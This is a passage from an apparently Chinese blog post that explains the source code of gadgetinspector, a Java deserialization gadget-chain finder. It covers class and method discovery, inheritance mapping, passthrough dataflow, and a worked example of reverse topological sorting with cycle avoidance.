List&lt;MethodReference&gt; discoveredMethods = <span class="keyword">new</span> ArrayList&lt;&gt;();<span class="comment">//保存所有方法信息</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//classResourceEnumerator.getAllClasses()获取了运行时的所有类(JDK rt.jar)以及要搜索应用中的所有类</span></span><br><span class="line">        <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">                ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cr.accept(<span class="keyword">new</span> MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);<span class="comment">//通过ASM框架操作字节码并将类信息保存到this.discoveredClasses，将方法信息保存到discoveredMethods</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">"Exception analyzing: "</span> + classResource.getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"classes.dat"</span>), <span class="keyword">new</span> ClassReference.Factory(), discoveredClasses);<span class="comment">//将类信息保存到classes.dat</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"methods.dat"</span>), <span class="keyword">new</span> MethodReference.Factory(), discoveredMethods);<span class="comment">//将方法信息保存到methods.dat</span></span><br><span class="line"></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">            classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        InheritanceDeriver.derive(classMap).save();<span class="comment">//查找所有继承关系并保存</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看下classes.dat、methods.dat分别长什么样子：</p><p><strong>classes.dat</strong></p><p>找了两个比较有特征的</p><table><thead><tr><th>类名</th><th>父类名</th><th>所有接口</th><th>是否是接口</th><th>成员</th></tr></thead><tbody><tr><td>com/sun/deploy/jardiff/JarDiffPatcher</td><td>java/lang/Object</td><td>com/sun/deploy/jardiff/JarDiffConstants,com/sun/deploy/jardiff/Patcher</td><td>false</td><td>newBytes!2![B</td></tr><tr><td>com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl</td><td>com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl</td><td>com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable</td><td>false</td><td>stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl</td></tr></tbody></table><p>第一个类com/sun/deploy/jardiff/JarDiffPatcher：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/2.png" alt=""></p><p>和上面的表格信息对应一下，是吻合的</p><ul><li>类名：com/sun/deploy/jardiff/JarDiffPatcher</li><li>父类：  java/lang/Object，如果一类没有显式继承其他类，默认隐式继承java/lang/Object，并且java中不允许多继承，所以每个类只有一个父类</li><li>所有接口：com/sun/deploy/jardiff/JarDiffConstants、com/sun/deploy/jardiff/Patcher</li><li>是否是接口：false</li><li>成员：newBytes!2![B，newBytes成员，Byte类型。为什么没有将static/final类型的成员加进去呢？这里还没有研究如何操作字节码，所以作者这里的判断实现部分暂且跳过。不过猜测应该是这种类型的变量并不能成为<strong>污点</strong>所以忽略了</li></ul><p>第二个类com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/3.png" alt=""></p><p>和上面的表格信息对应一下，也是吻合的</p><ul><li>类名：com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl，是一个内部类</li><li>父类：  com/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl</li><li>所有接口：com/sun/corba/se/spi/orbutil/proxy/LinkedInvocationHandler,java/io/Serializable</li><li>是否是接口：false</li><li>成员：stub!130!com/sun/corba/se/spi/presentation/rmi/DynamicStub!this$0!4112!com/sun/corba/se/impl/presentation/rmi/InvocationHandlerFactoryImpl，!*!这里可以暂时理解为分割符，有一个成员stub，类型com/sun/corba/se/spi/presentation/rmi/DynamicStub。因为是内部类，所以多了个this成员，这个this指向的是外部类</li></ul><p><strong>methods.dat</strong></p><p>同样找几个比较有特征的</p><table><thead><tr><th>类名</th><th>方法名</th><th>方法描述信息</th><th>是否是静态方法</th></tr></thead><tbody><tr><td>sun/nio/cs/ext/Big5</td><td>newEncoder</td><td>()Ljava/nio/charset/CharsetEncoder;</td><td>false</td></tr><tr><td>sun/nio/cs/ext/Big5_HKSCS$Decoder</td><td><init></init></td><td>(Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V</td><td>false</td></tr></tbody></table><p>sun/nio/cs/ext/Big5#newEncoder：</p><ul><li>类名：sun/nio/cs/ext/Big5</li><li>方法名： newEncoder</li><li>方法描述信息：  ()Ljava/nio/charset/CharsetEncoder;   无参，返回java/nio/charset/CharsetEncoder对象</li><li>是否是静态方法：false</li></ul><p>sun/nio/cs/ext/Big5_HKSCS$Decoder#<init>：</init></p><ul><li>类名：sun/nio/cs/ext/Big5_HKSCS$Decoder</li><li>方法名：<init></init></li><li>方法描述信息： (Ljava/nio/charset/Charset;Lsun/nio/cs/ext/Big5_HKSCS$1;)V   参数1是java/nio/charset/Charset类型，参数2是sun/nio/cs/ext/Big5_HKSCS$1类型，返回值void</li><li>是否是静态方法：false</li></ul><p><strong>继承关系的生成</strong></p><p>继承关系在后面用来判断一个类是否能被某个库序列化、以及搜索子类方法实现等会用到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceDeriver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> </span>&#123;</span><br><span class="line">        LOGGER.debug(<span class="string">"Calculating inheritance for "</span> + (classMap.size()) + <span class="string">" classes..."</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Already derived implicit classes for "</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            getAllParents(classReference, classMap, allParents);<span class="comment">//获取当前类的所有父类</span></span><br><span class="line"></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(classReference.getSuperClass()));<span class="comment">//父类</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> ClassReference.Handle(iface));<span class="comment">//接口类</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123;</span><br><span class="line">            <span class="comment">//获取间接父类，以及递归获取间接父类的父类</span></span><br><span class="line">            ClassReference parentClassReference = classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="keyword">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">"No class id for "</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步的结果保存到了inheritanceMap.dat：</p><table><thead><tr><th>类</th><th>直接父类+间接父类</th></tr></thead><tbody><tr><td>com/sun/javaws/OperaPreferences$PreferenceSection$PreferenceEntryIterator</td><td>java/lang/Object、java/util/Iterator</td></tr><tr><td>com/sun/java/swing/plaf/windows/WindowsLookAndFeel$XPValue</td><td>java/lang/Object、javax/swing/UIDefaults$ActiveValue</td></tr></tbody></table><h4 id="Step2-生成passthrough数据流"><a href="#Step2-生成passthrough数据流" class="headerlink" title="Step2 生成passthrough数据流"></a>Step2 生成passthrough数据流</h4><p>这里的passthrough数据流指的是每个方法的返回结果与方法参数的关系，这一步生成的数据会在生成passthrough调用图时用到。</p><p>以作者给出的demo为例，先从宏观层面判断下：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/4.png" alt=""></p><p>FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，所以所有成员变量都视为0参)、arg(参数1)的关系：</p><ul><li>与this的关系：返回了this.value，即与0参有关系</li><li>与arg的关系：返回值与arg没有任何关系，即与1参没有关系</li><li>结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0</li></ul><p>Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系：</p><ul><li>与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系</li><li>与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系</li><li>结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1</li></ul><p>在这一步中，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过标记追踪JVM虚拟机在执行方法时的stack和localvar，并最终得到返回结果是否可以被参数标记污染。</p><p>核心实现代码（TaintTrackingMethodVisitor涉及到字节码分析，暂时先不看）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PassthroughDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(PassthroughDiscovery.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();<span class="comment">//load之前保存的methods.dat</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();<span class="comment">//load之前保存的classes.dat</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();<span class="comment">//load之前保存的inheritanceMap.dat</span></span><br><span class="line"></span><br><span class="line">        Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);<span class="comment">//查找一个方法中包含的子方法</span></span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();<span class="comment">//对所有方法构成的图执行逆拓扑排序</span></span><br><span class="line">        passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">                config.getSerializableDecider(methodMap, inheritanceMap));<span class="comment">//计算生成passthrough数据流，涉及到字节码分析</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">            MethodReference.Handle method = entry.getKey();</span><br><span class="line">            outgoingReferences.put(method, <span class="keyword">new</span> HashSet&lt;&gt;(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对所有方法构成的图执行逆拓扑排序</span></span><br><span class="line">        LOGGER.debug(<span class="string">"Performing topological sort..."</span>);</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> ArrayList&lt;&gt;(outgoingReferences.size());</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">        &#125;</span><br><span class="line">        LOGGER.debug(String.format(<span class="string">"Outgoing references %d, sortedMethods %d"</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sortedMethods;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack.contains(node)) &#123;<span class="comment">//防止在dfs一条方法调用链中进入循环</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;<span class="comment">//防止对某个方法及子方法重复排序</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">        <span class="keyword">if</span> (outgoingRefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.add(node);</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.remove(node);</span><br><span class="line">        visitedNodes.add(node);</span><br><span class="line">        sortedMethods.add(node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拓扑排序</strong></p><p>有向无环图（DAG）才有拓扑排序，非 DAG 图没有拓扑排序。 当有向无环图满足以下条件时：</p><ul><li>每一个顶点出现且只出现一次</li><li>若A在序列中排在B的前面，则在图中不存在从B到A的路径</li></ul><p><img src="../images/Java反序列化工具gadgetinspector初窥/6.png" alt=""></p><p>这样的图，是一个拓扑排序的图。树结构其实可以转化为拓扑排序，而拓扑排序 不一定能够转化为树。</p><p>以上面的拓扑排序图为例，用一个字典表示图结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;</span><br><span class="line">    &quot;a&quot;: [&quot;b&quot;,&quot;d&quot;],</span><br><span class="line">    &quot;b&quot;: [&quot;c&quot;],</span><br><span class="line">    &quot;d&quot;: [&quot;e&quot;,&quot;c&quot;],</span><br><span class="line">    &quot;e&quot;: [&quot;c&quot;],</span><br><span class="line">    &quot;c&quot;: [],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">graph = &#123;</span><br><span class="line">    <span class="string">"a"</span>: [<span class="string">"b"</span>,<span class="string">"d"</span>],</span><br><span class="line">    <span class="string">"b"</span>: [<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"d"</span>: [<span class="string">"e"</span>,<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"e"</span>: [<span class="string">"c"</span>],</span><br><span class="line">    <span class="string">"c"</span>: [],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TopologicalSort</span><span class="params">(graph)</span>:</span></span><br><span class="line">  degrees = dict((u, <span class="number">0</span>) <span class="keyword">for</span> u <span class="keyword">in</span> graph)</span><br><span class="line">  <span class="keyword">for</span> u <span class="keyword">in</span> graph:</span><br><span class="line">      <span class="keyword">for</span> v <span class="keyword">in</span> graph[u]:</span><br><span class="line">          degrees[v] += <span class="number">1</span></span><br><span class="line">  <span class="comment">#入度为0的插入队列</span></span><br><span class="line">  queue = [u <span class="keyword">for</span> u <span class="keyword">in</span> graph <span class="keyword">if</span> degrees[u] == <span class="number">0</span>]</span><br><span class="line">  res = []</span><br><span class="line">  <span class="keyword">while</span> queue:</span><br><span class="line">      u = queue.pop()</span><br><span class="line">      res.append(u)</span><br><span class="line">      <span class="keyword">for</span> v <span class="keyword">in</span> graph[u]:</span><br><span class="line">          <span class="comment"># 移除边，即将当前元素相关元素的入度-1</span></span><br><span class="line">          degrees[v] -= <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> degrees[v] == <span class="number">0</span>:</span><br><span class="line">              queue.append(v)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">print(TopologicalSort(graph)) <span class="comment"># ['a', 'd', 'e', 'b', 'c']</span></span><br></pre></td></tr></table></figure><p>但是在方法的调用中，我们希望最后的结果是c、b、e、d、a，这一步需要逆拓扑排序，正向排序使用的BFS，那么得到相反结果可以使用DFS。为什么在方法调用中需要使用逆拓扑排序呢，这与生成passthrough数据流有关。看下面一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">parentMethod</span><span class="params">(String arg)</span></span>&#123;</span><br><span class="line">        String vul = Obj.childMethod(arg);</span><br><span class="line">        <span class="keyword">return</span> vul;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那么这里arg与返回值到底有没有关系呢？假设Obj.childMethod为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">childMethod</span><span class="params">(String carg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> carg.toString();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>由于childMethod的返回值carg与有关，那么可以判定parentMethod的返回值与参数arg是有关系的。所以如果存在子方法调用并传递了父方法参数给子方法时，需要先判断子方法返回值与子方法参数的关系。因此需要让子方法的判断在前面，这就是为什么要进行逆拓扑排序。</p><p>从下图可以看出outgoingReferences的数据结构为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    method1:(method2,method3,method4),</span><br><span class="line"></span><br><span class="line">    method5:(method1,method6),</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个结构正好适合逆拓扑排序</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/5.png" alt=""></p><p>但是上面说拓扑排序时不能形成环，但是在方法调用中肯定是会存在环的。作者是如何避免的呢？</p><p>在上面的dfsTsort实现代码中可以看到使用了stack和visitedNodes，stack保证了在进行逆拓扑排序时不会形成环，visitedNodes避免了重复排序。使用如下一个调用图来演示过程：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/7.png" alt=""></p><p>从图中可以看到有环med1-&gt;med2-&gt;med6-&gt;med1，并且有重复的调用med3，严格来说并不能进行逆拓扑排序，但是通过stack、visited记录访问过的方法，就能实现逆拓扑排序。为了方便解释把上面的图用一个树来表示：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/8.png" alt=""></p><p>对上图进行逆拓扑排序（DFS方式）：</p><p>从med1开始，先将med1加入stack中，此时stack、visited、sortedmethods状态如下：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/9.png" alt=""></p><p>med1还有子方法？有，继续深度遍历。将med2放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/10.png" alt=""></p><p>med2有子方法吗？有，继续深度遍历。将med3放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/11.png" alt=""></p><p>med3有子方法吗？有，继续深度遍历。将med7放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/12.png" alt=""></p><p>med7有子方法吗？没有，从stack中弹出med7并加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/13.png" alt=""></p><p>回溯到上一层，med3还有其他子方法吗？有，med8，将med8放入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/14.png" alt=""></p><p>med8还有子方法吗？没有，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/15.png" alt=""></p><p>回溯到上一层，med3还有其他子方法吗？没有了，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/16.png" alt=""></p><p>回溯到上一层，med2还有其他子方法吗？有，med6，将med6加入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/17.png" alt=""></p><p>med6还有子方法吗？有，med1，med1在stack中？不加入，抛弃。此时状态和上一步一样</p><p>回溯到上一层，med6还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/18.png" alt=""></p><p>回溯到上一层，med2还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/19.png" alt=""></p><p>回溯到上一层，med1还有其他子方法吗？有，med3，med3在visited中？在，抛弃。</p><p>回溯到上一层，med1还有其他子方法吗？有，med4，将med4加入stack，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/20.png" alt=""></p><p>med4还有其他子方法吗？没有，弹出stack，加入visited和sortedmethods中，此时的状态：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/21.png" alt=""></p><p>回溯到上一层，med1还有其他子方法吗？没有了，弹出stack，加入visited和sortedmethods中，此时的状态（即最终状态）：</p><p><img src="../images/Java反序列化工具gadgetinspector初窥/22.png" alt=""></p><p>所以最后的逆拓扑排序结果为：med7、med8、med3、med6、med2、med4、med1。</p><p><strong>生成passthrough数据流</strong></p><p>在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过：</p><ul><li>对于JDK(ObjectInputStream)，类否继承了Serializable接口</li><li>对于Jackson，类是否存在0参构造器</li><li>对于Xstream，类名能否作为有效的XML标签</li></ul><p>生成passthrough数据流代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 